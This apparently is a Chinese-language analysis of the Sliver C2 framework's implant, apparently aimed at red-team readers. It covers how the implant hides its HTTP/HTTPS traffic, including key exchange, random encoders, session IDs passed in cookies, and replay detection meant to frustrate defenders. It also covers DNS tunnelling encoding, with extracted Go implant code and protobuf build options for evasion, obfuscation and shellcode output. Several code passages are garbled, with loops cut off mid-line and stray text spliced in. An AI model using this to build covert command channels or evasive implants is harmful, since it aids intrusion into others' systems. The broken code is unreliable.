            return "", err
        }
        // {{if .Config.Debug}}
        log.Printf("[*] Thread completed execution, attempting to kill remote 
process\n")
        // {{end}}
        cmd.Process.Kill()
        return stdoutBuff.String() + stderrBuff.String(), nil
    }
    return "", nil
}
netstack
proxy
shell
注入技术
系统代理
通信流程
implant支持 mtls 、 WireGuard 、 http/https 、 dns 、 namedpipe 、 tcp 等协议的上线，
namedpipe 、 tcp 用于内网，加密程度不高，主要看看其他的。
HTTP/HTTPS
implant实现
implant在初始化时，会首先请求服务器获得一个公钥，再生成一个随机的AESKEY，用公钥加密后发送
到服务器，服务器确认后返回一个sessionid表示注册，后续implant只需要通过发送sessionid到服务
器，服务器即可根据sessionid找到对应的aeskey解密数据。
sliver的implant、client、server，所有通信的数据都是基于Go的struct，再经过 proto3 编码为字节发
送。关于 proto3 ，后面有介绍。
请求
随机编码器，通过随机数每次请求都会使用随机的编码器,在原aeskey的基础再次进行一次编码
uri的参数 _ 用来标记编码器的数字
通过cookie 标记sessionid
用 PHPSESSID 来传递sessionid
implant在初始化完成获得sessionID后，接着会启动两个GoRoutine(可以粗糙的理解为两个线程)，一个
用于发送，一个用于接收，它们都是监控一个变量，当一个变量获得值之后立马进行相应的操作（发送/
接收）。
如果是其他语言实现类似操作的话可能要实现一个内存安全的队列，而在Go里面可以用自带的语法实现
类似操作,既简单也明了。
关于implant实现http/https协议具体细节，画了一张脑图。
go func() {
    defer connection.Cleanup()
    for envelope := range send {
        data, _ := proto.Marshal(envelope)
        log.Printf("[http] send envelope ...")
        go client.Send(data)
    }
}()
HTTP/HTTPS server端一些有意思的点
伪时时回显
cobalt strike有sleep的概念，是implant每次回连server的时间，因为这个概念，每次执行命
令都会等待一段事件才能看到结果。
sliver的http/https协议上线没有sleep的概念，每次发送完命令它立马就能返回结果。
原理是server接收到implant的请求后，如果当前没有任务，会卡住implant的请求(最长一分
钟)，直至有任务出现。implant在timeout后也会再次请求，所以看到的效果就是发送的命令
立马就能得到回显。
重放检测
防止蓝队对数据进行重放，implant的编码和加密多种多样，还有一定的随机值，理论上不可
能会有内容一样包再次发送，sliver server会将每次的数据sha1编码的方式记录下来，如果蓝
队对数据进行重放攻击，则会返回错误页面。
DNS
dns协议虽然隐蔽，但它的限制较多，实现起来会有诸多束缚。
根据https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F dns域名限制
为253字符
对每一级域名长度的限制是63个字符
一个DNS TXT 记录字符串最多可包含255 个字符
知道了以上限制就可以设计自己的DNS上线协议了。
sliver设计的协议是最终发送DNS的数据都会经过base32编码（会处理掉=），使用了自己的编码表
dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789_")
sliver设计的域名发送格式为
subdata：表示发送的数据，最多3*63=189字节,subdata可能会有多个子域
seq：表示这是数据的第几个
nonce：一个10位字节的随机数,以防解析器忽略 TTL，以及后面防重放攻击的避免手段
sessionid: sessionid标记当前implant
msgType：表示执行的命令类型
parentdomain: 自定义的域名
计算发送次数
size := int(math.Ceil(float64(len(encoded)) / float64(dnsSendDomainStep)))
dnsSendDomainStep = 189      #每一级域名长度的限制是63个字符,sliver取3个子域用于发送数
据，最大可发送 63 * 3  = 189字节
但是最终数据都会经过Base 32 编码，所以 (n*8 + 4) /5 = 63,n=39，意味着每次请求最终可发送39*3 
=117 个字节
subdata 、 seq 、 nonce 由发送函数自动生成组装，sessionid、msgType、parentdomain 由用户控
制。我将它DNS发送函数抽取了出来，可以自己模拟DNS发送的过程。
subdata.seq.nonce.sessionid.msgType.parentdomain
package main
import (
    "bytes"
    "encoding/base32"
    "encoding/binary"
    "fmt"
    "log"
    "math"
    insecureRand "math/rand"
    "strings"
)
const (
    sessionIDSize = 16
    dnsSendDomainSeg  = 63
    dnsSendDomainStep = 189 // 63 * 3
    domainKeyMsg  = "_domainkey"
    blockReqMsg   = "b"
    clearBlockMsg = "cb"
    sessionInitMsg     = "si"
    sessionPollingMsg  = "sp"
    sessionEnvelopeMsg = "se"
    nonceStdSize = 6
    blockIDSize = 6
    maxBlocksPerTXT = 200 // How many blocks to put into a TXT resp at a time
)
var dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789_")
var base32Alphabet = "ab1c2d3e4f5g6h7j8k9m0npqrtuvwxyz"
var sliverBase32 = base32.NewEncoding(base32Alphabet)
func dnsEncodeToString(input []byte) string {
    encoded := sliverBase32.EncodeToString(input)
    // {{if .Config.Debug}}
    log.Printf("[base32] %#v", encoded)
    // {{end}}
    return strings.TrimRight(encoded, "=")
}
// dnsNonce - Generate a nonce of a given size in case the resolver ignores the 
TTL
func dnsNonce(size int) string {
    nonce := []rune{}
    for i := 0; i 
    //                [63].[63].[63].[4].[20].[12].[3].
    //                    ... ~235 chars ...
    //                Max parent domain: ~20 chars
    //
    for index := 0; index 服务器通信中，有些是特定于植入服务器的。
 *`rpcpb` -gRPC 服务定义
syntax = "proto3";
package clientpb;
option go_package = "github.com/bishopfox/sliver/protobuf/clientpb";
import "commonpb/common.proto";
// [ Version ] ----------------------------------------
message Version {
  int32 Major = 1;
  int32 Minor = 2;
  int32 Patch = 3;
  string Commit = 4;
  bool Dirty = 5;
  int64 CompiledAt = 6;
  string OS = 7;
  string Arch = 8;
}
// [ Core ] ----------------------------------------
message Session {
  uint32 ID = 1;
  string Name = 2;
  string Hostname = 3;
  string UUID = 4;
  string Username = 5;
  string UID = 6;
  string GID = 7;
  string OS = 8;
  string Arch = 9;
  string Transport = 10;
  string RemoteAddress = 11;
  int32 PID = 12;
  string Filename = 13; // Argv[0]
  string LastCheckin = 14;
  string ActiveC2 = 15;
  string Version = 16;
  bool Evasion = 17;
  bool IsDead = 18;
  uint32 ReconnectInterval = 19;
  string ProxyURL = 20;
}
message ImplantC2 {
  uint32 Priority = 1;
  string URL = 2;
  string Options = 3; // Protocol specific options
}
message ImplantConfig {
  string GOOS = 1;
  string GOARCH = 2;
  string Name = 3;
  string CACert = 4;
  string Cert = 5;
  string Key = 6;
  bool Debug = 7;
  bool Evasion = 31;
  bool ObfuscateSymbols = 30;
  uint32 ReconnectInterval = 8;
  uint32 MaxConnectionErrors = 9;
  // c2
  repeated ImplantC2 C2 = 10;
  repeated string CanaryDomains = 11;
  bool LimitDomainJoined = 20;
  string LimitDatetime = 21;
  string LimitHostname = 22;
  string LimitUsername = 23;
  string LimitFileExists = 32;
  enum OutputFormat {
    SHARED_LIB = 0;
    SHELLCODE = 1;
    EXECUTABLE = 2;
    SERVICE = 3;
  }
  OutputFormat Format = 25;
  bool IsSharedLib = 26;
  string FileName = 27;
  bool IsService = 28;
  bool IsShellcode = 29;
}
// Configs of previously built implants
message ImplantBuilds {
  map Configs = 1;
}
message DeleteReq {
  string Name = 1;
}
// DNSCanary - Single canary and metadata
message DNSCanary {
  string ImplantName = 1;
  string Domain = 2;
  bool Triggered = 3;
  string FirstTriggered = 4;
  string LatestTrigger = 5;
  uint32 Count = 6;
}
message Canaries {
  repeated DNSCanary Canaries = 1;
}
message ImplantProfile {
  string Name = 1;
  ImplantConfig Config = 2;
}
message ImplantProfiles {
  repeated ImplantProfile Profiles = 1;
}
message RegenerateReq {
  string ImplantName = 1;
}